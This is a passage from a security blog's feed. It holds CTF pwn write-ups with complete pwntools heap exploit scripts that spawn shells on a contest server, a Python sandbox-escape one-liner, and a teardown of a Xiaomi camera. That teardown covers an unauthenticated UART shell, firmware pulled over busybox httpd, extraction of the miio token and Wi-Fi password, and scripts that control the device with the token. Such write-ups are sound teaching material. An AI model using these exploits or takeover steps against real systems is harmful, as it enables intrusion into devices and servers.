    <content type="html"><![CDATA[<h2 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h2><p>题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为server.py<br>然后把下载下来的文件解压，搜索server.py ，查看可知</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978442882.png" class="lozad"><br>python input()的时候沙箱逃逸，直接<strong>import</strong>(‘os’).system(“cat /home/ctf/flag”) ,获取到flag</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978742005.png" class="lozad"></p><h2 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h2><p>申请堆块的时候是用strdup来申请的，strdup是根据输入的字符串长度来申请堆块的，若add(0,0x90,‘aaaa’)，edit的时候则造成溢出。<br>此题没有free功能，利用house of orange 攻击 造成一个free过后的堆块，然后伪造size，通过溢出修改 free过后堆块的fd为chunklist附近区域，然后fastbin attack 申请堆块到chunklist，控制堆块指针，修改chunklist[1]为strdup函数的got表，edit功能修改strdup的got表为printf_got,再利用格式化字符串漏洞泄露libc_addr，最后再次修改strdup_got为system_got,然后申请”/bin/sh”的堆块，即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"pwn"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'101.200.53.148'</span>,<span class="number">12301</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------house of orange-------------</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xfe1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x1e</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x70</span>,chr(i)*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x81</span>,chr(<span class="number">0x20</span>)*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x71</span>,chr(<span class="number">0x21</span>)*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,chr(<span class="number">0x22</span>)*<span class="number">0x90</span>) <span class="comment"># fastbin </span></span><br><span class="line"><span class="comment">#----------fastbin attack-----------</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x20</span>)*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602128</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x23</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x24</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------chunklist attack---------</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"e"</span>*<span class="number">0x88</span>+p64(<span class="number">0x6021c0</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x602068</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">"printf"</span>]))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"%17$p"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) <span class="number">-240</span>-libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">info(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">sys_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">info(<span class="string">"sys_addr"</span>,sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597995302847.png" class="lozad"></p><h2 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h2><p>off-by-one漏洞，没有show功能，老套路了，布局堆块，溢出修改下一个堆块的size包含多个堆块，然后free，根据unsorted bin的特性使得fastbin里面有残留的main_area地址然后修改后两位字节，有十六分之一的几率为 stdout_addr-0x43，然后fastbin_attack 打_IO_2_1_stdout_,修改io_flags为0xfbad1887即可泄露出libc_addr,再次fastbin_attack 打malloc_hook为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">"101.200.53.148"</span>, <span class="number">34521</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:\n'</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'len:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span>,<span class="string">'e'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf0</span>,<span class="string">'f'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'aaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x88'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line">malloc_hook  = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base + <span class="number">0x3c54fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"\x41"</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">'\x42'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'\x43'</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"0"</span>*<span class="number">0x28</span>+<span class="string">'\xe1'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xa0</span>,<span class="string">"3"</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"><span class="comment">#add(8,0xa0,"3"*0x68+p64(0x71)+p64(io_list_all))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">"\x44"</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_base + one[<span class="number">2</span>]))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your token:"</span>,<span class="string">'icq700049c29f86f68a9b934524cf619'</span>)</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;babyjsc&quot;&gt;&lt;a href=&quot;#babyjsc&quot; class=&quot;headerlink&quot; title=&quot;babyjsc&quot;&gt;&lt;/a&gt;babyjsc&lt;/h2&gt;&lt;p&gt;题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为serve
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>米家小白智能摄像头分析</title>
    <link href="https://nocbtm.github.io/2020/07/21/%E7%B1%B3%E5%AE%B6%E5%B0%8F%E7%99%BD%E6%99%BA%E8%83%BD%E6%91%84%E5%83%8F%E5%A4%B4%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/07/21/米家小白智能摄像头分析/</id>
    <published>2020-07-21T11:10:45.000Z</published>
    <updated>2020-09-01T11:46:01.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="大致分析"><a href="#大致分析" class="headerlink" title="大致分析"></a>大致分析</h2><p>拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片</p><p>小米做的是真的好，不太好拆，可参考硬核拆解</p><p><a href="https://www.bilibili.com/video/BV1d4411G7vu?t=64" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1d4411G7vu?t=64</a></p><p><a href="http://www.eepw.com.cn/article/201608/295287.htm" target="_blank" rel="noopener">http://www.eepw.com.cn/article/201608/295287.htm</a></p><p>拆完可以看到，这么大的NOR Flash，一般的编程器提取不了，需要更专业的设备。</p><p><img alt="image-20200807110220255" data-src="https://nocbtm.github.io/imgs/image-20200807110220255.png" class="lozad"></p><p>uart调试口一般都在flash的附近，仔细观看。正面没有，看看反面</p><p>这里有一个坑点，有两个Rx，Tx口。经过测试如下已经焊接上的口是真正的，而另一个接上没反应。</p><p><img alt="image-20200807111406761" data-src="https://nocbtm.github.io/imgs/image-20200807111406761.png" class="lozad"></p><p>用SecureCRT接上，波特率选择115200</p><p><img alt="image-20200807133925437" data-src="https://nocbtm.github.io/imgs/image-20200807133925437.png" class="lozad"></p><p>连上之后，没有做用户认证，直接就进来了。看了下开启的端口，有些怪异的地方</p><p>23端口运行着 linuxrc ，这应该是防止开启telnetd服务吧</p><p>而且没有开启554端口的rtsp服务来传输视频，可能用的别的服务吧</p><p><img alt="image-20200807122344393" data-src="https://nocbtm.github.io/imgs/image-20200807122344393.png" class="lozad"></p><p>百度了一下运行的程序</p><p>其中24883端口的<code>pulseaudio</code>是一个声音服务器，用来传输声音的</p><p>摄像头内网1883端口的<code>mosquitto</code>是一款实现了消息推送协议 MQTT v3.1 的开源消息代理软件，用来传输监控视频的</p><p>而且他传输视频不像普通摄像头那么简单，我把他进程杀的差不多了，手机还能看到监控视频</p><p>而54321端口运行的是小米的miio协议，可参考<a href="https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md" target="_blank" rel="noopener">https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md</a></p><p><img alt="image-20200807140936533" data-src="https://nocbtm.github.io/imgs/image-20200807140936533.png" class="lozad"></p><p>针对这个端口python已经有攻击的库了，可参考<a href="https://github.com/rytilahti/python-miio，" target="_blank" rel="noopener">https://github.com/rytilahti/python-miio，</a></p><p><img alt="image-20200807142959137" data-src="https://nocbtm.github.io/imgs/image-20200807142959137.png" class="lozad"></p><p><img alt="image-20200807142031135" data-src="https://nocbtm.github.io/imgs/image-20200807142031135.png" class="lozad"></p><p>难受的是现在还不支持小白摄像头，只能自己分析一下了</p><h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>可以看到我们想要分析的程序在 ./usr/bin/目录下</p><p><img alt="image-20200807144200666" data-src="E:\hexo\myhexo\source\imgs\image-20200807144200666.png" class="lozad"></p><p>busybox刚好自带httpd服务，默认是不开器的，我们把它打开，用来传输文件</p><p>把 ./usr 目录 和 ./lib 目录都压缩一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">busybox httpd</span><br><span class="line">tar -zcvf usr.tar.gz ./usr</span><br><span class="line">tar -zcvf lib.tar.gz ./lib</span><br></pre></td></tr></table></figure><p>然后wget下来，进行解压  <code>tar -zxvf usr.tar.gz</code></p><p><img alt="image-20200807145210801" data-src="https://nocbtm.github.io/imgs/image-20200807145210801.png" class="lozad"></p><h2 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h2><p>找到了摄像头的初始化脚本，可以看到程序的启动方式<code>/usr/bin/mosquitto -c /etc/mosquitto/mosquitto.conf -d</code></p><p><code>/usr/bin/miio_client -D</code></p><p><img alt="" data-src="E:\hexo\myhexo\source\imgs\image-20200807145919673.png" class="lozad"></p><p>使用qemu模拟，先把mosquitt跑起来，再跑 miio_client</p><p><img alt="image-20200807150954939" data-src="https://nocbtm.github.io/imgs/image-20200807150954939.png" class="lozad"></p><p><img alt="image-20200807151142230" data-src="https://nocbtm.github.io/imgs/image-20200807151142230.png" class="lozad"></p><p>然后向54321发送udp数据，可以看到成功接收到</p><p><img alt="image-20200807155050870" data-src="https://nocbtm.github.io/imgs/image-20200807155050870.png" class="lozad"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>根据一些字符串可以快速定位到代码</p><p><img alt="image-20200807155620286" data-src="https://nocbtm.github.io/imgs/image-20200807155620286.png" class="lozad"></p><p>可以分析出传输的数据是json格式的，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;method&quot;:&quot;get_prop&quot;,&quot;params&quot;:[&quot;night_state&quot;,&quot;night_beg_time&quot;,&quot;night_end_time&quot;]&#125;</span><br></pre></td></tr></table></figure><p>而且需要认证ID</p><p><img alt="image-20200807160052510" data-src="https://nocbtm.github.io/imgs/image-20200807160052510.png" class="lozad"></p><p>可以看到有很多配置<code>method</code></p><p><img alt="image-20200807155838345" data-src="https://nocbtm.github.io/imgs/image-20200807155838345.png" class="lozad"></p><p>进入miIo.config_router方法可以看到接收的数据都是用<code>json_object_object_add</code>函数来匹配接收的，</p><p>代码写的很好，没有发现什么栈溢出漏洞</p><p><img alt="image-20200807163002510" data-src="https://nocbtm.github.io/imgs/image-20200807163002510.png" class="lozad"></p><p>但还是能分析出来一些敏感信息，wifi的连接密码</p><p><img alt="image-20200807165114652" data-src="https://nocbtm.github.io/imgs/image-20200807165114652.png" class="lozad"></p><p>miio的配置文件</p><p><img alt="image-20200807164907414" data-src="E:\hexo\myhexo\source\imgs\image-20200807164907414.png" class="lozad"></p><p>miio的验证token</p><p><img alt="image-20200807165257875" data-src="https://nocbtm.github.io/imgs/image-20200807165257875.png" class="lozad"></p><p>通过这个token就可以控制摄像头，先安装python-miio方便利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install python-miio</span><br></pre></td></tr></table></figure><p>目前这个库还不支持这款摄像头，需要自己再改写一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> protocol <span class="keyword">import</span> Message</span><br><span class="line"></span><br><span class="line">helobytes=bytes.fromhex(<span class="string">'21310020ffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">s.sendto(helobytes,(<span class="string">'192.168.137.159'</span>,<span class="number">54321</span>))<span class="comment">#插座ip，端口54321</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">m=Message.parse(data)</span><br><span class="line">tok=codecs.encode(m.checksum,<span class="string">'hex'</span>)</span><br><span class="line">print(m)</span><br><span class="line">print(tok)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> miio</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">s = miio.device.Device(ip=ip, token=token)</span><br><span class="line">s.info()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">from</span> miio.chuangmi_plug <span class="keyword">import</span> ChuangmiPlug</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">d = ChuangmiPlug(ip=ip, token=token)</span><br><span class="line"></span><br><span class="line">x=d.status() <span class="comment"># 给出设备的状态</span></span><br><span class="line"><span class="comment"># x: &lt;ChuangmiPlugStatus power=True, usb_power=None, temperature=46, load_power=None, wifi_led=None&gt;</span></span><br><span class="line"><span class="comment"># x.power = True</span></span><br><span class="line">x=d.info()</span><br><span class="line"><span class="comment"># type(z)</span></span><br><span class="line"><span class="comment"># miio.device.DeviceInfo</span></span><br><span class="line"><span class="comment"># print(z)</span></span><br><span class="line"><span class="comment"># chuangmi.plug.m3 v1.3.8_0002 (04:CF:8C:5F:**:**) @ 192.168.1.20 - token: *****</span></span><br><span class="line">x=d.off()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br><span class="line">x=d.on()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" 